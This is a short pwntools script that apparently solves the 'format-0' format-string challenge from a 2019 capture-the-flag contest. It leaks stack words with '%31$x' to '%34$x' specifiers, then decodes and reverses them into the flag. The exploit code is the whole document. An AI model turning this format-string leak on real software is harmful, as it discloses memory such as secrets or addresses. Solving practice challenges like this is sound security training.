#!/usr/bin/env python3
from pwn import *


p = process('./format-0')
# p = remote('shell.2019.nactf.com', 31782)

payload = ''

# The flag is 16 chars (including new line) so we loop that many bytes:
for i in range(31, 35):
    payload = '%' + str(i) + '$x' + payload
p.sendlineafter('Type something>', payload)

p.recvuntil(': ')

# We use -3 instead of -1 to also remove the newline character,
# which is taken literally as "\n".
# We use 3 instead of 2 because there is
# an extra junk character at the beginning:
leak = str(p.recv())[3:-3]  # Convert from bytes to string without decoding.

# We need to reverse the flag because the bytes are reversed:
flag = bytes.fromhex(leak).decode('utf-8')[::-1]

print(flag)
p.close()
